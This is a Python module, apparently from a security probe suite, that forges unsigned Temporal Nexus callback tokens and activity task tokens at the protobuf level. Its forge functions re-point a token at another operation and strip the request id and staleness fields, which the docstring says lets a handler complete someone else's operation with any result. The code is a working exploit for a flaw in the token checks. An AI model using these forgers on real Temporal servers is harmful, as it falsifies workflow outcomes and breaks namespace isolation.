"""Forges Temporal Nexus completion callback tokens, for the forged-completion probe.

Temporal's callback token (``Temporal-Callback-Token``) is an unsigned
``{"v": 1, "d": base64url(NexusOperationCompletion)}``. A Nexus handler receives the token
of the operation it serves, which names the caller's namespace, workflow and run, and the
operation's state machine (HSM) or CHASM component. History accepts a completion whose
token carries no ``request_id`` without comparing it to the operation's (server
v1.32.1 ``components/nexusoperations/completion.go``, ``chasm/lib/nexusoperation/operation.go``),
so a handler that rewrites its own token to point at ANOTHER operation of the same caller,
and drops the request id, can complete that operation with any result -- by attaching the
token to a workflow it starts in its own namespace with a ``temporal://system`` callback.

The internal protos are not shipped with the Python SDK, so this works on the protobuf
wire format directly. Field numbers are from server v1.32.1
``proto/internal/temporal/server/api/{token,persistence}/v1``.
"""

from __future__ import annotations

import base64
import json
from collections.abc import Iterator

TOKEN_HEADER = "temporal-callback-token"

# NexusOperationCompletion
_C_NAMESPACE_ID, _C_WORKFLOW_ID, _C_RUN_ID, _C_REF, _C_REQUEST_ID, _C_COMPONENT_REF = (
    1,
    2,
    3,
    4,
    5,
    6,
)
# StateMachineRef / StateMachineKey
_R_PATH, _R_MUTABLE_STATE_VT = 1, 2
_K_ID = 2
# ChasmComponentRef
_CR_BUSINESS_ID, _CR_RUN_ID, _CR_EXECUTION_VT, _CR_COMPONENT_INITIAL_VT = 2, 3, 5, 7


def _read_varint(data: bytes, i: int) -> tuple[int, int]:
    shift = value = 0
    while True:
        b = data[i]
        i += 1
        value |= (b & 0x7F) << shift
        if not b & 0x80:
            return value, i
        shift += 7


def _varint(value: int) -> bytes:
    out = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def _fields(data: bytes) -> Iterator[tuple[int, int, bytes | int]]:
    i = 0
    while i < len(data):
        key, i = _read_varint(data, i)
        num, wire = key >> 3, key & 7
        if wire == 0:
            value, i = _read_varint(data, i)
            yield num, wire, value
        elif wire == 2:
            length, i = _read_varint(data, i)
            yield num, wire, data[i : i + length]
            i += length
        else:  # the messages here use only varints and length-delimited fields
            raise ValueError(f"unsupported wire type {wire}")


def _field(num: int, wire: int, value: bytes | int) -> bytes:
    key = _varint(num << 3 | wire)
    if wire == 0:
        assert isinstance(value, int)
        return key + _varint(value)
    assert isinstance(value, bytes)
    return key + _varint(len(value)) + value


def _decode(token: str) -> bytes:
    envelope = json.loads(token)
    data: str = envelope["d"]
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))


def _encode(completion: bytes) -> str:
    return json.dumps({"v": 1, "d": base64.urlsafe_b64encode(completion).decode()})


def token_of(headers: dict[str, str]) -> str:
    """The callback token among a Nexus start request's callback headers."""
    for key, value in headers.items():
        if key.lower() == TOKEN_HEADER:
            return value
    raise KeyError(TOKEN_HEADER)


def request_id(token: str) -> str:
    for num, _, value in _fields(_decode(token)):
        if num == _C_REQUEST_ID:
            assert isinstance(value, bytes)
            return value.decode()
    return ""


def is_chasm(token: str) -> bool:
    return any(num == _C_COMPONENT_REF for num, _, _ in _fields(_decode(token)))


def hsm_operation_id(token: str) -> str:
    """The state machine id (the scheduled event id) of the operation a HSM token names."""
    for num, _, value in _fields(_decode(token)):
        if num == _C_REF:
            assert isinstance(value, bytes)
            for rnum, _, rvalue in _fields(value):
                if rnum == _R_PATH:
                    assert isinstance(rvalue, bytes)
                    for knum, _, kvalue in _fields(rvalue):
                        if knum == _K_ID:
                            assert isinstance(kvalue, bytes)
                            return kvalue.decode()
    raise ValueError("not a HSM completion token")


def forge_hsm(token: str, operation_id: str) -> str:
    """Re-point a workflow caller's (HSM) token at another operation of the same workflow
    run, and drop the request id and the staleness transition, so history checks neither."""
    out = b""
    for num, wire, value in _fields(_decode(token)):
        if num == _C_REQUEST_ID:
            continue
        if num == _C_REF:
            assert isinstance(value, bytes)
            ref = b""
            for rnum, rwire, rvalue in _fields(value):
                if rnum == _R_MUTABLE_STATE_VT:
                    continue
                if rnum == _R_PATH:
                    assert isinstance(rvalue, bytes)
                    key = b""
                    for knum, kwire, kvalue in _fields(rvalue):
                        key += _field(
                            knum, kwire, operation_id.encode() if knum == _K_ID else kvalue
                        )
                    rvalue = key
                ref += _field(rnum, rwire, rvalue)
            value = ref
        out += _field(num, wire, value)
    return _encode(out)


def forge_chasm(token: str, business_id: str) -> str:
    """Re-point a standalone operation's (CHASM) token at another standalone operation of
    the same namespace, by operation id, with no request id, run id or transitions."""
    out = b""
    for num, wire, value in _fields(_decode(token)):
        if num == _C_REQUEST_ID:
            continue
        if num == _C_COMPONENT_REF:
            assert isinstance(value, bytes)
            ref = b""
            for rnum, rwire, rvalue in _fields(value):
                if rnum in (_CR_RUN_ID, _CR_EXECUTION_VT, _CR_COMPONENT_INITIAL_VT):
                    continue
                ref += _field(
                    rnum, rwire, business_id.encode() if rnum == _CR_BUSINESS_ID else rvalue
                )
            value = ref
        out += _field(num, wire, value)
    return _encode(out)


def with_request_id(token: str, value: str) -> str:
    """The token with its request id replaced (a guessed one, for the negative control)."""
    out = b"".join(
        _field(num, wire, val) for num, wire, val in _fields(_decode(token)) if num != _C_REQUEST_ID
    )
    return _encode(out + _field(_C_REQUEST_ID, 2, value.encode()))


def activity_task_token(namespace_id: str, workflow_id: str, run_id: str = "") -> bytes:
    """A forged activity task token (``tokenspb.Task``) naming another namespace. Task
    tokens are unsigned too; the frontend must refuse one whose namespace is not the
    caller's."""
    out = _field(1, 2, namespace_id.encode()) + _field(2, 2, workflow_id.encode())
    if run_id:
        out += _field(3, 2, run_id.encode())
    return out + _field(4, 0, 5) + _field(5, 0, 1) + _field(6, 2, b"1")
